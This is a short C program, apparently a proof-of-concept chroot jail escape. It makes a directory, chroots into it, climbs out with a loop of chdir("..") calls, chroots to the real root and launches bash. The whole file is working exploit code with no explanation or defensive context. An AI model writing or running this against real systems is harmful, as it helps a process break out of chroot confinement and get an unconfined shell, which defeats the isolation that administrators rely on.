#include <sys/stat.h>
#include <unistd.h>
#include <fcntl.h>

int main() {
    mkdir("jail_break", 0755);
    chroot("jail_break");
    for(int i = 0; i < 100; i++) {
        chdir("..");
    }
    chroot(".");
    execl("/bin/bash", "-i", NULL);
    return 0;
}
